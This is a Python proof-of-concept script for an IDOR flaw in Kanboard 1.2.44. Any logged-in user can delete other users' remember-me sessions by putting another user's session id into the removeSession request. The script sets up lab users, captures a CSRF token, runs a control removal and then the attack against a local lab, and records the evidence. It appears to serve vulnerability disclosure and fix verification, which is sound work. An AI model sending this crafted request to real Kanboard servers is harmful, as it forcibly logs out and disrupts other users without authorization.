#!/usr/bin/env python3
"""PoC for CVE-2026-56774 / GHSA-vvjm-mjq4-27c8 — IDOR: any authenticated user
can delete other users' RememberMe sessions in Kanboard 1.2.44.

UserViewController::removeSession() validates the CSRF token and resolves the
user (getUser() rejects non-admins referencing anyone but themselves), but then
passes the raw `id` request parameter straight to
RememberMeSessionModel::remove(), which deletes the row by id ALONE — no
ownership check:

    $this->rememberMeSessionModel->remove($this->request->getIntegerParam('id'));

Demonstrated here:
  * CONTROL — alice deletes HER OWN RememberMe session via the same UI the
    real app uses (the Remove link on her sessions page). This works on both
    the vulnerable and the patched build.
  * ATTACK — the same request with bob's session id in `id` and alice's own
    user_id. On the vulnerable build bob's row is deleted, destroying the
    "remember me" cookie bob relies on (row removal is exactly how Kanboard
    itself invalidates that cookie on logout). On the patched build the
    deletion is a no-op (removal is scoped to the owning user).

Session ids are small sequential integers, so enumeration is trivial; this
script reads them from MariaDB purely as a deterministic lab oracle.

Exit codes: 0 = vulnerability reproduced; 2 = deletion refused (fixed);
            1 = setup error.
"""
import os
import pathlib
import re
import subprocess
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from kb import KB

BASE = "http://localhost:8080"
ALICE, ALICE_PASS = "alice", "alice-P1"
BOB, BOB_PASS = "bob", "bob-P1"
TAG = os.environ.get("POC_TAG", "vulnerable")
EVID = pathlib.Path(__file__).resolve().parent.parent / "evidence" / "02-idor" / TAG

USER_CREATE = "/?controller=UserCreationController&action=show"


def die(msg):
    print("[setup-fail] " + msg)
    sys.exit(1)


def form(html):
    m = re.search(r'<form[^>]*method="post"[^>]*action="([^"]+)"', html)
    action = m.group(1).replace("&amp;", "&") if m else None
    fields = set(re.findall(r'<(?:input|select|textarea)[^>]*name="([^"]+)"', html))
    return action, fields, KB.csrf_token(html)


def user_id_of(page, username):
    i = page.find(">" + username + "<")
    if i < 0:
        return None
    last = None
    for m in re.finditer(r'user_id=(\d+)', page[:i]):
        last = m
    return last.group(1) if last else None


def remember_me_rows():
    """Lab oracle: the remember_me table (see docstring for the enumeration
    caveat — this only makes the PoC deterministic)."""
    r = subprocess.run(
        ["docker", "exec", "lab-mariadb", "sh", "-c",
         'mariadb -ukanboard -plabdbpw -N kanboard -e "SELECT id, user_id FROM remember_me ORDER BY id"'],
        capture_output=True, text=True)
    if r.returncode != 0:
        die("mariadb oracle failed: " + r.stderr.strip())
    return [tuple(line.split()) for line in r.stdout.strip().splitlines() if line.strip()]


def rows_txt(rows):
    return "id\tuser_id\n" + "\n".join("%s\t%s" % r for r in rows) + "\n"


def row_for(rows, user_id):
    hits = [r for r in rows if r[1] == user_id]
    return hits[-1][0] if hits else None


def create_user(admin, username, password):
    create_form = admin.get(USER_CREATE)
    action, fields, tok = form(create_form)
    if tok is None or "username" not in fields:
        die("user-create form not found")
    data = {"username": username, "name": username, "role": "app-user",
            "csrf_token": tok}
    if "password" in fields:
        data["password"] = password
        if "confirmation" in fields:
            data["confirmation"] = password
    admin.post(action, data)


def replay_remember_cookie(cookie):
    """Fresh browser instance presenting only the remember-me cookie."""
    fresh = KB(BASE)
    if cookie is None:
        return None, False, "no remember cookie available"
    fresh.set_cookie(cookie.name, cookie.value)
    p_root = fresh.get("/")
    p_login = fresh.get("/?controller=AuthController&action=login")
    in_root = "action=logout" in p_root
    in_login = "action=logout" in p_login
    return fresh.remember_cookie(), (in_root or in_login), \
        "auto-login: on / = %s, on login page = %s" % (in_root, in_login)


def main():
    EVID.mkdir(parents=True, exist_ok=True)
    print("== CVE-2026-56774 IDOR PoC against", BASE, "==")

    admin = KB(BASE)
    if not admin.login("admin", "admin"):
        die("admin/admin login failed — is the vulnerable lab running and fresh?")
    print("[1] admin session up")

    create_user(admin, ALICE, ALICE_PASS)
    create_user(admin, BOB, BOB_PASS)
    users_page = admin.get("/?controller=UserListController&action=show")
    alice_id = user_id_of(users_page, ALICE)
    bob_id = user_id_of(users_page, BOB)
    if not alice_id or not bob_id:
        die("could not resolve alice/bob user ids")
    print("[2] alice (id", alice_id, ") and bob (id", bob_id, ") provisioned as app-users")

    bob = KB(BASE)
    if not bob.login(BOB, BOB_PASS, remember=True):
        die("bob login with remember-me failed")
    rc_bob = bob.remember_cookie()
    if rc_bob is None:
        die("bob has no remember-me cookie")
    print("[3] bob logged in with remember-me (cookie:", rc_bob.name + ")")

    alice = KB(BASE)
    if not alice.login(ALICE, ALICE_PASS, remember=True):
        die("alice login failed")
    if alice.remember_cookie() is None:
        die("alice has no remember-me cookie")
    print("[4] alice logged in with remember-me (so her sessions page renders Remove links)")

    rows = remember_me_rows()
    (EVID / "01-rememberme-before.txt").write_text(rows_txt(rows))
    alice_row = row_for(rows, alice_id)
    bob_row = row_for(rows, bob_id)
    if not alice_row or not bob_row:
        die("expected one remember_me row each for alice and bob, got: %r" % (rows,))
    print("[5] remember_me before: alice row", alice_row, ", bob row", bob_row)

    rc_latest, pre_ok, pre_detail = replay_remember_cookie(rc_bob)
    (EVID / "02-pre-attack-replay.txt").write_text(pre_detail + "\n")
    print("[6] pre-attack replay of bob's cookie ->", pre_detail)
    if pre_ok:
        rows = remember_me_rows()
        bob_row = row_for(rows, bob_id)
        if not bob_row:
            die("bob's row disappeared after the replay — investigate rotation")
        print("    (replay rotated bob's row; current row:", bob_row + ")")

    sess_page = alice.get("/?controller=UserViewController&action=sessions&user_id=" + alice_id)
    (EVID / "03-alice-sessions-page.html").write_text(sess_page)
    links = [l.replace("&amp;", "&") for l in re.findall(r'href="([^"]*removeSession[^"]*)"', sess_page)]
    if not links:
        die("no Remove links on alice's sessions page")
    m = re.search(r'csrf_token=([0-9a-f]+)', links[0])
    if m is None:
        die("no csrf_token inside alice's Remove links")
    alice_token = m.group(1)
    alice_own_ids = [re.search(r'[?&]id=(\d+)', l).group(1) for l in links]
    print("[7] alice's sessions page: csrf token captured; her own session ids:", alice_own_ids)

    control_url = ("/?controller=UserViewController&action=removeSession&user_id="
                   + alice_id + "&id=" + alice_own_ids[0] + "&csrf_token=" + alice_token)
    alice.get(control_url)
    (EVID / "04-control-removal-request.txt").write_text(
        "CONTROL (legitimate): GET " + control_url +
        "\nalice removes her own RememberMe session — the same UI the app provides.\n")
    rows = remember_me_rows()
    (EVID / "05-control-removal-after.txt").write_text(rows_txt(rows))
    control_ok = row_for(rows, alice_id) is None
    print("[8] CONTROL: alice removed her own session ->", "works" if control_ok else "FAILED")
    if not control_ok:
        die("control self-removal failed — request shape is wrong")

    bob_row = row_for(rows, bob_id)
    if not bob_row:
        die("bob's row vanished before the attack")
    attack = ("/?controller=UserViewController&action=removeSession"
              "&user_id=" + alice_id + "&id=" + bob_row + "&csrf_token=" + alice_token)
    print("[9] ATTACK: alice requests (her own user_id, bob's session id):")
    print("    " + attack)
    resp = alice.get(attack)
    (EVID / "06-attack-request.txt").write_text(
        "ATTACK (IDOR): GET " + attack + "\n\nSent by alice, an ordinary app-user, "
        "with her own session, her own CSRF token and her own user_id (satisfies "
        "getUser()). Only the id parameter points at bob's RememberMe session row "
        "(" + bob_row + ").\n")
    (EVID / "07-attack-response.html").write_text(resp)

    rows_after = remember_me_rows()
    (EVID / "08-rememberme-after.txt").write_text(rows_txt(rows_after))
    gone = row_for(rows_after, bob_id) is None
    print("[10] remember_me after attack:", rows_after)

    _, post_ok, post_detail = replay_remember_cookie(rc_latest)
    (EVID / "09-post-attack-replay.txt").write_text(post_detail + "\n")
    print("[11] post-attack replay of bob's cookie ->", post_detail)

    if gone:
        print("[VERDICT] VULNERABLE — alice deleted bob's RememberMe session with "
              "her own credentials (row removal is exactly how Kanboard invalidates "
              "the remember-me cookie on logout). Cookie replay now:", post_detail)
        sys.exit(0)
    if control_ok:
        print("[VERDICT] FIXED — alice's legitimate self-removal works, but bob's row survives")
        sys.exit(2)
    print("[VERDICT] inconsistent state — investigate")
    sys.exit(1)


if __name__ == "__main__":
    main()
